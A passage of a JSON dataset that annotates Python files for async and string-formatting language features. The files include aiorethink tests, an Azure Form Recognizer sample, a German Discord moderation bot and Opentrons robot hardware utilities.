FCWithSpecialDBReprField(f2 = \"Bla\", f_swapcase = \"Hello\")\ndef test_get_dbvalue(fc_with_swapcase_field):\n    d = fc_with_swapcase_field\n    assert d.get(\"f_swapcase\") == \"Hello\"\n    assert d.get_dbvalue(\"f_swapcase\") == \"hELLO\"\n    assert d.get_dbvalue(\"f2\") == \"Bla\"\n    assert d.get_dbvalue(\"not_exist\") == None\n    assert d.get_dbvalue(\"not_exist\", 1) == 1\ndef test_set_dbvalue(fc_with_swapcase_field):\n    d = fc_with_swapcase_field\n    d.set_dbvalue(\"f_swapcase\", \"World\")\n    d.set_dbvalue(\"f2\", \"World\")\n    assert d.get(\"f_swapcase\") == \"wORLD\"\n    assert d.get(\"f2\") == \"World\"\n    assert d.get_dbvalue(\"f_swapcase\") == \"World\"\n    assert d.get_dbvalue(\"f2\") == \"World\"\ndef test_dbvalues(fc_with_swapcase_field):\n    d = fc_with_swapcase_field\n    d.f1 = \"z\"\n    values = list(d.dbvalues(ar.ALL))\n    values.sort()\n    assert values == [\"Bla\", \"hELLO\", \"z\"]\n    values = list(d.dbvalues(ar.DECLARED_ONLY))\n    values.sort()\n    assert values == [\"hELLO\", \"z\"]\n    values = list(d.dbvalues(ar.UNDECLARED_ONLY))\n    values.sort()\n    assert values == [\"Bla\"]\ndef test_dbitems(fc_with_swapcase_field):\n    d = fc_with_swapcase_field\n    items = d.dbitems()\n    assert len(items) == 3\n    for k, v in items:\n        assert d.get_dbvalue(k) == v\ndef test_to_doc(fc_with_swapcase_field):\n    d = fc_with_swapcase_field\n    e = d.to_doc()\n    assert set(e.keys()) == set(d.dbkeys())\n    for k, v in e.items():\n        assert d.get_dbvalue(d.get_key_for_dbkey(k)) == v\ndef test_validate_a_field(fc_mixed):\n    assert fc_mixed == fc_mixed.validate_field(\"f1\")\n    assert fc_mixed == fc_mixed.validate_field(\"f2\")\n    with pytest.raises(ValueError):\n        fc_mixed.validate_field(\"f3\")\n    with pytest.raises(ValueError):\n        fc_mixed.validate_field(\"field_that_does_not_exist\")\ndef test_validate_simple_fc(fc_mixed):\n    fc_mixed.validate()\n    fc_mixed.f2 = \"hello\"\n    fc_mixed[\"f4\"] = 0\n    fc_mixed[\"new_field\"] = \"blah\"\n    fc_mixed.validate()\n    fc_mixed.validate()\n@pytest.fixture\ndef FCEvenValidator(FCWithFields):\n    class FCIntValidator(FCWithFields):\n        def validate(self):\n            super().validate()\n            if type(self.f1) != int or type(self.f2) != int:\n                raise ar.ValidationError(\"f1 or f2 is not int\")\n    class FCEvenValidator(FCIntValidator):\n        def validate(self):\n            super().validate()\n            if (self.f1 + self.f2) % 2 != 0:\n                raise ar.ValidationError(\"f1 + f2 not even\")\n    return FCEvenValidator\ndef test_validate_fc(FCEvenValidator):\n    d = FCEvenValidator(f1 = 1, f2 = 3, f3 = 1)\n    d.validate()\n    d.f2 = 5\n    d.validate()\ndef test_fail_validation_not_even(FCEvenValidator):\n    d = FCEvenValidator(f1 = 1, f2 = 3)\n    d.validate()\n    d.f1 += 1\n    with pytest.raises(ar.ValidationError):\n        d.validate()\ndef test_fail_validation_not_int(FCEvenValidator):\n    d = FCEvenValidator(f1 = 1, f2 = \"hello\")\n    with pytest.raises(ar.ValidationError):\n        d.validate()\ndef test_from_doc(EmptyFC,\n        FCWithFields,\n        fc_mixed,\n        fc_special_dbname,\n        fc_with_swapcase_field):\n    fc_empty = EmptyFC()\n    fc_with_fields = FCWithFields()\n    for fc in [fc_empty, fc_with_fields, fc_mixed, fc_special_dbname,\n            fc_with_swapcase_field]:\n        db_doc = fc.to_doc()\n        fc2 = fc.__class__.from_doc(db_doc)\n        for k, v in fc.items():\n            assert fc2[k] == v\n        for k, v in fc2.items():\n            assert fc[k] == v\n@pytest.mark.asyncio\nasync def test_from_query(FCWithFields, db_conn, aiorethink_db_session):\n    cn = await db_conn\n    await r.table_create(\"test\", durability=\"soft\").run(cn)\n    res = await FCWithFields.from_query(r.table(\"test\").get(1))\n    assert res == None\n    d = FCWithFields(f1 = 1, f2 = 0, id = 1)\n    await r.table(\"test\").insert(d.to_doc()).run(cn)\n    res = await FCWithFields.from_query(r.table(\"test\").get(1))\n    assert isinstance(res, FCWithFields)\n    assert res.f1 == 1\n    assert res.f2 == 0\n    assert res[\"id\"] == 1\n    res = await FCWithFields.from_query(r.table(\"test\").filter({\"f1\": 1}))\n    assert isinstance(res, ar.db.CursorAsyncMap)\n    async for d in res:\n        assert isinstance(d, FCWithFields)\n    res = await FCWithFields.from_query(r.table(\"test\").filter({\"f1\": 2}))\n    assert isinstance(res, ar.db.CursorAsyncMap)\n    async for d in res:\n        assert isinstance(d, FCWithFields)\ndef test_fc_vt(FCWithFields):\n    class FCWithFieldsValueType(ar.FieldContainerValueType):\n        _val_instance_of = FCWithFields\n    vt = FCWithFieldsValueType()\n    fc = FCWithFields(f1 = 1, f2 = 2)\n    assert vt.validate(fc) == vt\n    assert vt.pyval_to_dbval(fc) == fc.to_doc()\n    assert vt.dbval_to_pyval(fc.to_doc()) == fc",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        319,
                        320,
                        "async for",
                        "async for d in res:\n        assert isinstance(d, FCWithFields)"
                    ],
                    [
                        323,
                        324,
                        "async for",
                        "async for d in res:\n        assert isinstance(d, FCWithFields)"
                    ]
                ]
            }
        },
        "99": {
            "file": "import os\nimport asyncio\nasync def sample_manage_models_async():\n    from azure.core.credentials import AzureKeyCredential\n    from azure.core.exceptions import ResourceNotFoundError\n    from azure.ai.formrecognizer.aio import DocumentModelAdministrationClient\n    endpoint = os.environ[\"AZURE_FORM_RECOGNIZER_ENDPOINT\"]\n    key = os.environ[\"AZURE_FORM_RECOGNIZER_KEY\"]\n    container_sas_url = os.environ[\"CONTAINER_SAS_URL\"]\n    document_model_admin_client = DocumentModelAdministrationClient(endpoint=endpoint, credential=AzureKeyCredential(key))\n    async with document_model_admin_client:\n        account_info = await document_model_admin_client.get_account_info()\n        print(\"Our account has {} custom models, and we can have at most {} custom models\\n\".format(\n            account_info.model_count, account_info.model_limit\n        ))\n        models = document_model_admin_client.list_models()\n        print(\"We have the following 'ready' models with IDs and descriptions:\")\n        async for model in models:\n            print(\"{} | {}\".format(model.model_id, model.description))\n        poller = await document_model_admin_client.begin_build_model(container_sas_url, description=\"model for sample\")\n        model = await poller.result()\n        my_model = await document_model_admin_client.get_model(model_id=model.model_id)\n        print(\"\\nModel ID: {}\".format(my_model.model_id))\n        print(\"Description: {}\".format(my_model.description))\n        print(\"Model created on: {}\".format(my_model.created_on))\n        await document_model_admin_client.delete_model(model_id=my_model.model_id)\n        try:\n            await document_model_admin_client.get_model(model_id=my_model.model_id)\n        except ResourceNotFoundError:\n            print(\"Successfully deleted model with ID {}\".format(my_model.model_id))\nasync def main():\n    await sample_manage_models_async()\nif __name__ == '__main__':\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(main())",
            "patterns": {
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        18,
                        19,
                        "async for",
                        "async for model in models:\n            print(\"{} | {}\".format(model.model_id, model.description))"
                    ]
                ],
                "pep_498v": [
                    [
                        13,
                        15,
                        ".format()"
                    ],
                    [
                        23,
                        23,
                        ".format()"
                    ],
                    [
                        24,
                        24,
                        ".format()"
                    ],
                    [
                        25,
                        25,
                        ".format()"
                    ],
                    [
                        19,
                        19,
                        ".format()"
                    ],
                    [
                        30,
                        30,
                        ".format()"
                    ]
                ]
            }
        },
        "100": {
            "file": "import aiohttp\nimport os\nimport discord\nimport discord.ext\nfrom discord.ext import commands\nimport datetime\nimport asyncio\nimport random\nfrom random import randint\nimport time\nimport sys\nimport json\nimport Config\nbot = commands.Bot(command_prefix=Config.PREFIX, description=\" \")\nbot_version = Config.Version\nepoch = datetime.datetime.utcfromtimestamp(0)\nplayers = {}\nkillResponses = (\"%s ist aus Versehen in die Lave geschupst worden. UPS\",\n                 \"%s ist auf ein Wolf gesto\u00dfen, danach h\u00f6rte man nichts mehr von ihm.\",\n                 \"Ich habe %s mal um die Ecke gebracht, kam alleine zur\u00fcck.\",\n                 \"Hat wer %s gesehen? War vorher mit ihm am Fluss.\",\n                 \"Ich habe %s vergiftet. Wer m\u00f6chte einen sterbenden %s sehen?\",\n                 \"Habe %s 's Kopf weggerissen und in M\u00fclleimer geworfen.\",\n                 \"%s findet sein Gehirn nichtmehr. *Psst! Ich habs zerschrettert, sag es aber niemanden*\",\n                 \"Sorry %s, aber ich musste dich leider erschie\u00dfen.\")\nyodaResponses = (\"Schlafen du jetzt musst, sonst du morgen m\u00fcde sein wirst.\",\n                 \"Unm\u00f6glich zu sehen, die Zukunft ist.\",\n                 \"Gro\u00df machen Kriege niemand.\",\n                 \"Furcht der Pfad zur dunklen Seite ist.\",\n                 \"Eure Sinne ihr nutzen m\u00fcsst.\",\n                 \"Die Macht stark in dir ist.\",\n                 \"Grammatik ich von Yoda gelernt haben.\",\n                 \"Viel zu lernen du noch hast, mein junger Padawan.\",\n                 \"Tue es oder tue es nicht! Versuchen es nicht gibt.\",\n                 \"Die macht nur zur Verteidigung benutzen du darfst. Niemals zum Angriff!\",\n                 \"Dich lebend zu sehen mich erfreut, %s\",\n                 \"Der Tod ein nat\u00fcrlicher Bestandteil des Lebens ist.\",\n                 \"Ins Exil ich muss, versagt ich haben.\",\n                 \"Feigling du bist, wenn du folgen der dunklen Seite.\",\n                 \"Kleine Truppe wir sind, daf\u00fcr gr\u00f6\u00dfer im Geist.\",\n                 \"Deine Wahrnehmung deine Realit\u00e4t bestimmen wird.\",\n                 \"Geburtstag du hast! Alter Sack du jetzt bist.\",\n                 \"M\u00fcde ich bin, Kaffee ich jetzt brauch.\",\n                 \"Montag! Schrecklich er ist.\",\n                 \"Schnauze halten du musst, bis ich Kaffee fertig getrunken habe.\",\n                 \"M\u00f6ge das Wetter mit deuch sein.\",\n                 \"Yodafone - Der Internetanbieter f\u00fcr Jedis\",\n                 \"Kaffee du bringen mir musst, sonst t\u00f6ten ich dich werde.\",\n                 \"Die dunkle Seite st\u00e4rker als Chuck Norris ist.\",\n                 \"Auf dein Herz h\u00f6ren du musst, um zu erf\u00fcllen deine Tr\u00e4ume.\",\n                 \"Du nicht grundlos t\u00f6ten darfst!\")\n@bot.event\nasync def on_ready():\n    print(\"------------Eingeloggt--------------\")\n    print(\"Bot Name: \" + bot.user.name)\n    print(\"Bot ID: \" + bot.user.id)\n    print(\"Bot Version: \" + bot_version)\n    print(\"Discord Version: \" + discord.__version__)\n    print(\"Datum: \" + datetime.datetime.now().strftime(\"%d-%m-%y %H:%M:%S\"))\n    servers = list(bot.servers)\n    print(\"Connected on '\" + str(len(bot.servers)) + \"' servers!\")\n    print(\"Watching '\" + str(len(set(bot.get_all_members()))) + \"' players!\")\n    print(\"------------------------------------\")\n    bot.loop.create_task(status_task())\n    print(\"Running on: \" + sys.platform)\n@bot.event\nasync def on_message(message):\n    user = message.author\n    channel = message.channel\n    msg = message.content\n    server = message.author.server\n    if message.author == bot.user:\n        print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S] [MessageReceive] S:{}|C:{}| Bot antwortete:\".format(server,channel)), msg)\n    else:\n        print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S] [MessageReceive] S:{}|C:{}|\".format(server,channel)), user, \":\", msg)\n        await bot.process_commands(message)\nasync def status_task():\n    await asyncio.sleep(2)\n    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), \"[RP-Cycle] Starting!\")\n    while True:\n        await bot.change_presence(game=discord.Game(name=(\"Running on: [\" + str(len(bot.servers)) + \"] Server!\")))\n        await asyncio.sleep(10)\n        await bot.change_presence(game=discord.Game(name=(\"Overwatching [\" + str(len(set(bot.get_all_members()))) + \"] Players!\")))\n        await asyncio.sleep(10)\n@bot.command()\nasync def discordversion():\n    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), '[Discordversion-Command]')\n    await bot.say(\"Discord Version: \" + discord.__version__)\n@bot.command()\nasync def choose(*choices : str):\n    Choosing = random.choice(choices)\n    embed = discord.Embed(color=discord.Color.dark_grey())\n    embed.add_field(name=\"Ich habe folgendes gew\u00e4hlt:\", value=Choosing)\n    embed.add_field(name=\"Zur Auswahl standen:\", value=choices, inline=False)\n    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), '[Choose-Command]')\n    await bot.say(embed=embed)\n@bot.command()\nasync def bitcoin():\n    url = 'https://api.coindesk.com/v1/bpi/currentprice/BTC.json'\n    async with aiohttp.ClientSession() as session:  \n        raw_response = await session.get(url)\n        response = await raw_response.text()\n        response = json.loads(response)\n        await bot.say(\"Derzeitiger Wert des Bitcoins: $\" + response['bpi']['USD']['rate'])\n@bot.command(pass_context=True)\nasync def profile(ctx, member: discord.Member = None):\n    if member == None:\n        author = ctx.message.author\n        avatar = ctx.message.author.avatar_url\n        joined = author.joined_at.__format__('%A, %d. %B %Y um %H:%M:%S')\n        toprole = ctx.message.author.top_role\n        nicker = ctx.message.author.nick\n        userID = ctx.message.author.id\n    else:\n        author = member.name\n        avatar = member.avatar_url\n        joined = member.joined_at.__format__('%A, %d. %B %Y um %H:%M:%S')\n        toprole = member.top_role\n        nicker = member.nick\n        userID = member.id\n    embed = discord.Embed(title=\"User Information\", color=discord.Color.dark_grey(),)\n    embed.add_field(name=\"Username:\", value=author)\n    embed.set_thumbnail(url=avatar)\n    embed.add_field(name='Nickname:', value=nicker, inline=True)\n    embed.add_field(name='User ID:', value=userID, inline=False)\n    embed.add_field(name=\"H\u00f6chste Role:\", value=toprole, inline=False)\n    embed.add_field(name='Beigetreten am:', value=joined, inline=False)\n    executor = ctx.message.author\n    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), '[Profile-Command] By:', executor)\n    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), 'Profile shown from:', author)\n    await bot.say(embed=embed)\n@bot.command(pass_context=True)\nasync def kill(ctx, *, member: discord.Member = None):\n    executor = ctx.message.author\n    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), '[Kill-Command] By:', executor)\n    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), 'Versuchte Mord von: ', member)\n    if member is None:\n        await bot.say(\"Wenn ich das Universum t\u00f6te bleibt nichts mehr \u00fcbrig und das m\u00f6chte ich nicht!\")\n        return\n    if member.id == \"484382176180305950\":\n        await bot.say(\"Mich kann man nicht t\u00f6ten! Ich bin der Tod! :knife: \")\n    elif member.id == \"484382176180305950\" and ctx.message.author.id == \"261179915892686849\":\n        await bot.say(\"Ich m\u00f6chte dich aber nicht t\u00f6ten, Meister!\")\n    elif member.id == \"261179915892686849\":\n        await bot.say(\"Ich t\u00f6te meinen Meister nicht!\")\n    elif member.id == ctx.message.author.id:\n        await bot.say(\"Du kannst auch Selbstmord betreiben. Dann mach ich mir die H\u00e4nde nicht schmutzig!\")\n    else:\n        choice = killResponses[random.randrange(0, len(killResponses))] % member.mention\n        await bot.say(choice)\n@bot.command(pass_context=True)\nasync def yoda(ctx, *, member: discord.Member = None):\n    executor = ctx.message.author\n    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), '[Yoda-Command] By:', executor)\n    choice = yodaResponses[random.randrange(0, len(yodaResponses))]\n    await bot.say(embed=discord.Embed(color=discord.Color.dark_green(), description=choice))\n@bot.command()\n@commands.bot_has_permissions(mention_everyone=True)\nasync def say(*, content):\n    await bot.say(content)\n    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), '[Say-Command]')\n@bot.command(pass_context=True)\nasync def wolfbot(ctx):\n    executor = ctx.message.author\n    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), '[Wolfbot-Command] By:', executor)\n    emb = discord.Embed(color=discord.Color.dark_orange(), description=bot.user.name)\n    emb.add_field(name=\"Name:\", value=bot.user.name)\n    emb.add_field(name=\"Version:\", value=bot_version)\n    emb.add_field(name=\"Developer:\", value=\"TheLonelyWolf\")\n    emb.add_field(name=\"Mein Zweck:\", value=\"Ich passe auf, dass es keine Anarchy gibt\")\n    emb.set_footer(text=\"Discord-Version: \" + discord.__version__)\n    await bot.say(embed=emb)\n@commands.has_permissions(manage_messages=True)\n@commands.bot_has_permissions(manage_messages=True)\n@bot.command(pass_context=True)\nasync def vanish(ctx, number):\n    mgs = []  \n    number = int(number)  \n    number2 = number + 1\n    async for x in bot.logs_from(ctx.message.channel, limit=number2):\n        mgs.append(x)\n    await bot.delete_messages(mgs)\n    executer = ctx.message.author\n    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), '[Vanish-Command] By:', executer)\n@bot.command(pass_context=True)\n@commands.has_permissions(kick_members=True)\n@commands.bot_has_permissions(kick_members=True)\nasync def kick(ctx, member: discord.Member = None):\n    kicker = ctx.message.author\n    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), '[Kick-Command] By:', kicker, '| Kicked:',\n          member)\n    if member is None:\n        await bot.say(ctx.message.author.mention + \": Sch\u00f6ner Scherz!\")\n    elif member.id == ctx.message.author.id:\n        await bot.say(ctx.message.author.mention + \": Du kannst dich nicht selber kicken!\")\n    elif member.id == \"484382176180305950\":\n        await bot.say(ctx.message.author.mention + \": Ich kick mich nicht selbst!\")\n    else:\n        await bot.kick(member)\n        await bot.say(member.mention + \" wurde von \" + ctx.message.author.mention + \"***gekickt!***\")\n@kick.error\nasync def kick_error(ctx, error):\n    await bot.say('User nicht gefunden :bangbang:')\n@bot.command(pass_context=True)\n@commands.has_permissions(ban_members=True)\n@commands.bot_has_permissions(ban_members=True)\nasync def ban(ctx, member: discord.Member = None):\n    banner = ctx.message.author\n    members = ctx.message.server.members\n    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), '[Bann-Command] By:', banner, '| Banned:',\n          member)\n    if member is None:\n        await bot.say(ctx.message.author.mention + \": Sch\u00f6ner Scherz!\")\n    elif member.id == ctx.message.author.id:\n        await bot.say(ctx.message.author.mention + \": Du kannst dich nicht selber bannen!\")\n    elif member.id == \"484382176180305950\":\n        await bot.say(ctx.message.author.mention + \": Ich bann mich nicht selbst!\")\n    else:\n        await bot.ban(member)\n        await bot.say(member.mention + \" wurde von \" + ctx.message.author.mention + \"***gebannt!***\")\n@ban.error\nasync def ban_error(ctx, error):\n    await bot.say('User nicht gefunden :bangbang:')\n@bot.command(pass_context=True)\nasync def ping(ctx):\n    executer = ctx.message.author\n    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), '[Ping-Command] By:', executer)\n    before = time.monotonic()\n    await bot.delete_message(ctx.message)\n    ping = (time.monotonic() - before) * 1000\n    await bot.say(content=f\"Bot l\u00e4uft bei: `{int(ping)}ms`\")\n    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), f'Ping {int(ping)}ms')\n@bot.command(pass_context=True)\nasync def commands(ctx, ):\n    executer = ctx.message.author\n    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), '[Commands-Command] By:', executer)\n    emb = discord.Embed(color=discord.Color.dark_orange(), description=\"Meine Befehle:\")\n    emb.add_field(name=\"ping:\", value=\"Ping des Bots\", inline=True)\n    emb.add_field(name=\"info:\", value=\"Info \u00fcber die 218.\", inline=True)\n    emb.add_field(name=\"kick:\", value=\" Kickt ein User\", inline=True)\n    emb.add_field(name=\"ban:\", value=\"Bannt ein User\", inline=True)\n    emb.add_field(name=\"wolfbot:\", value=\"Info \u00fcber mich\", inline=True)\n    emb.add_field(name=\"commands:\", value=\"Meine Befehle\", inline=True)\n    emb.add_field(name=\"say:\", value=\"Sende dein Text\", inline=True)\n    emb.add_field(name=\"vanish:\", value=\"L\u00f6sche Nachricht(en)\", inline=True)\n    emb.add_field(name=\"kill:\", value=\"Wenn soll ich t\u00f6ten?\", inline=True)\n    emb.add_field(name=\"yoda:\", value=\"Yoda-Weisheiten\", inline=True)\n    emb.add_field(name=\"servers:\", value=\"Wieviel Server benutzen mich\", inline=True)\n    emb.add_field(name=\"profile:\", value=\"User Infos\", inline=True)\n    emb.add_field(name=\"choose:\", value=\"W\u00e4hlt aus verschiedenen Begriffen\", inline=True)\n    emb.add_field(name=\"bitcoin:\", value=\"Zeigt den aktuellen Bitcoin Wert\", inline=True)\n    emb.add_field(name=\"discordversion:\", value=\"Zeigt die aktuelle Discord Version\", inline=True)\n    emb.set_footer(text=\"Missbraucht sie ja nicht!\")\n    await bot.say(embed=emb)\n@bot.command(pass_context=True)\nasync def servers(ctx):\n    executer = ctx.message.author\n    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), '[Servers-Command] By:', executer)\n    servers = list(bot.servers)\n    await bot.say(\"[\" + str(len(bot.servers)) + \"] Server mit [\" + str(len(set(bot.get_all_members()))) + \"] Spieler nutzen mich aktuell!\")\n@bot.command(pass_context=True)\nasync def info(ctx, ):\n    executer = ctx.message.author\n    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), '[Info-Command] By:', executer)\n    embed = discord.Embed(title=\"Division Information\", color=discord.Color.dark_green(),\n                          description=\"Infos \u00fcber die 218.Gaming Division\")\n    embed.add_field(name=\"Owner:\", value=\"TheLonelyWolf\")\n    embed.add_field(name=\"Gr\u00fcndungsdatum:\",\n                    value=\"__***Die 218.Gaming Division wurde am 20. Juni 2018 von TheLonelyWolf gegr\u00fcndet!***__\")\n    await bot.say(embed=embed)\ntoken = os.environ.get(\"TOKEN\")\nbot.run(token)",
            "patterns": {
                "pep_567": [
                    [
                        7,
                        7,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        180,
                        181,
                        "async for",
                        "async for x in bot.logs_from(ctx.message.channel, limit=number2):\n        mgs.append(x)"
                    ]
                ],
                "pep_498v": [
                    [
                        73,
                        73,
                        ".format()"
                    ],
                    [
                        75,
                        75,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        232,
                        "    print(datetime.datetime.now().strftime(\"[%d-%m-%y|%H:%M:%S]\"), f'Ping {int(ping)}ms')"
                    ],
                    [
                        231,
                        "    await bot.say(content=f\"Bot l\u00e4uft bei: `{int(ping)}ms`\")"
                    ]
                ]
            }
        },
        "101": {
            "file": "import asyncio\nfrom dataclasses import dataclass\nfrom datetime import datetime\nfrom math import pi\nfrom subprocess import run\nfrom time import time\nfrom typing import Callable, Coroutine, Dict, List, Optional, Tuple, Union\nfrom opentrons_hardware.drivers.can_bus import DriverSettings, build, CanMessenger\nfrom opentrons_hardware.drivers.can_bus import settings as can_bus_settings\nfrom opentrons_hardware.firmware_bindings.constants import SensorId\nfrom opentrons_hardware.sensors import sensor_driver, sensor_types\nfrom opentrons_shared_data.deck import load as load_deck\nfrom opentrons_shared_data.labware import load_definition as load_labware\nfrom opentrons.config.robot_configs import build_config_ot3, load_ot3 as load_ot3_config\nfrom opentrons.config.advanced_settings import set_adv_setting\nfrom opentrons.hardware_control.backends.ot3utils import sensor_node_for_mount\nfrom opentrons.hardware_control.instruments.ot2.pipette import Pipette as PipetteOT2\nfrom opentrons.hardware_control.instruments.ot3.pipette import Pipette as PipetteOT3\nfrom opentrons.hardware_control.motion_utilities import deck_from_machine\nfrom opentrons.hardware_control.ot3api import OT3API\nfrom .types import (\n    GantryLoad,\n    PerPipetteAxisSettings,\n    OT3Axis,\n    OT3Mount,\n    Point,\n    CriticalPoint,\n)\nTIP_LENGTH_OVERLAP = 10.5\nTIP_LENGTH_LOOKUP = {50: 57.9, 200: 58.35, 1000: 95.6}\n@dataclass\nclass CalibrationSquare:\n    top_left_offset: Point\n    width: float\n    height: float\n    depth: float\n@dataclass\nclass CalibrationProbe:\n    length: float\n    diameter: float\nCALIBRATION_SQUARE_OFFSET_EVT = Point(x=64, y=-43, z=-0.25)\nCALIBRATION_SQUARE_EVT = CalibrationSquare(\n    top_left_offset=CALIBRATION_SQUARE_OFFSET_EVT, width=20, height=20, depth=3\n)\nCALIBRATION_PROBE_EVT = CalibrationProbe(length=44.5, diameter=4.0)\ndef stop_server_ot3() -> None:\n    print('Stopping \"opentrons-robot-server\"...')\n    run([\"systemctl\", \"stop\", \"opentrons-robot-server\"])\ndef start_server_ot3() -> None:\n    print('Starting \"opentrons-robot-server\"...')\n    run([\"systemctl\", \"start\", \"opentrons-robot-server\"])\ndef restart_canbus_ot3() -> None:\n    print('Restarting \"opentrons-ot3-canbus\"...')\n    run([\"systemctl\", \"restart\", \"opentrons-ot3-canbus\"])\ndef stop_on_device_display_ot3() -> None:\n    run([\"systemctl\", \"stop\", \"opentrons-robot-app\"])\ndef _create_fake_pipette_id(mount: OT3Mount, model: Optional[str]) -> Optional[str]:\n    if model is None:\n        return None\n    items = model.split(\"_\")\n    assert len(items) == 3\n    size = \"P1K\" if items[0] == \"p1000\" else \"P50\"\n    channels = \"S\" if items[1] == \"single\" else \"M\"\n    version = items[2].upper().replace(\".\", \"\")\n    date = datetime.now().strftime(\"%y%m%d\")\n    unique_number = 1 if mount == OT3Mount.LEFT else 2\n    return f\"{size}{channels}{version}{date}A0{unique_number}\"\ndef _create_attached_instruments_dict(\n    pipette_left: Optional[str] = None,\n    pipette_right: Optional[str] = None,\n    gripper: Optional[str] = None,\n) -> Dict[OT3Mount, Dict[str, Optional[str]]]:\n    fake_id_left = _create_fake_pipette_id(OT3Mount.LEFT, pipette_left)\n    fake_id_right = _create_fake_pipette_id(OT3Mount.RIGHT, pipette_right)\n    fake_id_gripper = (\n        \"GRPV1020221101A02\" if gripper else None\n    )  \n    sim_pip_left = {\"model\": pipette_left, \"id\": fake_id_left}\n    sim_pip_right = {\"model\": pipette_right, \"id\": fake_id_right}\n    sim_gripper = {\"model\": gripper, \"id\": fake_id_gripper}\n    return {\n        OT3Mount.LEFT: sim_pip_left,\n        OT3Mount.RIGHT: sim_pip_right,\n        OT3Mount.GRIPPER: sim_gripper,\n    }\nasync def build_async_ot3_hardware_api(\n    is_simulating: Optional[bool] = False,\n    use_defaults: Optional[bool] = True,\n    pipette_left: Optional[str] = None,\n    pipette_right: Optional[str] = None,\n    gripper: Optional[str] = None,\n    loop: Optional[asyncio.AbstractEventLoop] = None,\n    stall_detection_enable: Optional[bool] = None,\n) -> OT3API:\n    if stall_detection_enable is not None:\n        try:\n            await set_adv_setting(\n                \"disableStallDetection\", False if stall_detection_enable else True\n            )\n        except ValueError as e:\n            print(e)\n    config = build_config_ot3({}) if use_defaults else load_ot3_config()\n    kwargs = {\"config\": config}\n    if is_simulating:\n        builder: Callable[\n            ..., Coroutine[None, None, OT3API]\n        ] = OT3API.build_hardware_simulator\n        sim_pips = _create_attached_instruments_dict(\n            pipette_left, pipette_right, gripper\n        )\n        kwargs[\"attached_instruments\"] = sim_pips  \n    else:\n        builder = OT3API.build_hardware_controller\n        stop_server_ot3()\n        restart_canbus_ot3()\n        kwargs[\"use_usb_bus\"] = True  \n    try:\n        api = await builder(loop=loop, **kwargs)  \n    except Exception as e:\n        if is_simulating:\n            raise e\n        print(e)\n        kwargs[\"use_usb_bus\"] = False  \n        api = await builder(loop=loop, **kwargs)  \n    if not is_simulating:\n        await asyncio.sleep(0.5)\n        await api.cache_instruments()\n        async for update in api.update_firmware():\n            print(f\"Update: {update.subsystem.name}: {update.progress}%\")\n    return api\ndef set_gantry_per_axis_setting_ot3(\n    settings: PerPipetteAxisSettings, axis: OT3Axis, load: GantryLoad, value: float\n) -> None:\n    axis_kind = OT3Axis.to_kind(axis)\n    if load == GantryLoad.HIGH_THROUGHPUT:\n        settings.high_throughput[axis_kind] = value\n    else:\n        settings.low_throughput[axis_kind] = value\ndef get_gantry_per_axis_setting_ot3(\n    settings: PerPipetteAxisSettings, axis: OT3Axis, load: GantryLoad\n) -> float:\n    axis_kind = OT3Axis.to_kind(axis)\n    if load == GantryLoad.HIGH_THROUGHPUT:\n        return settings.high_throughput[axis_kind]\n    return settings.low_throughput[axis_kind]\nasync def set_gantry_load_per_axis_current_settings_ot3(\n    api: OT3API,\n    axis: OT3Axis,\n    load: Optional[GantryLoad] = None,\n    hold_current: Optional[float] = None,\n    run_current: Optional[float] = None,\n) -> None:\n    if load is None:\n        load = api.gantry_load\n    if hold_current is not None:\n        set_gantry_per_axis_setting_ot3(\n            settings=api.config.current_settings.hold_current,\n            axis=axis,\n            load=load,\n            value=hold_current,\n        )\n    if run_current is not None:\n        set_gantry_per_axis_setting_ot3(\n            settings=api.config.current_settings.run_current,\n            axis=axis,\n            load=load,\n            value=run_current,\n        )\n    await api.set_gantry_load(load)\nasync def set_gantry_load_per_axis_motion_settings_ot3(\n    api: OT3API,\n    axis: OT3Axis,\n    load: Optional[GantryLoad] = None,\n    default_max_speed: Optional[float] = None,\n    acceleration: Optional[float] = None,\n    max_speed_discontinuity: Optional[float] = None,\n    direction_change_speed_discontinuity: Optional[float] = None,\n) -> None:\n    if load is None:\n        load = api.gantry_load\n    if default_max_speed is not None:\n        set_gantry_per_axis_setting_ot3(\n            settings=api.config.motion_settings.default_max_speed,\n            axis=axis,\n            load=load,\n            value=default_max_speed,\n        )\n    if acceleration is not None:\n        set_gantry_per_axis_setting_ot3(\n            settings=api.config.motion_settings.acceleration,\n            axis=axis,\n            load=load,\n            value=acceleration,\n        )\n    if max_speed_discontinuity is not None:\n        set_gantry_per_axis_setting_ot3(\n            settings=api.config.motion_settings.max_speed_discontinuity,\n            axis=axis,\n            load=load,\n            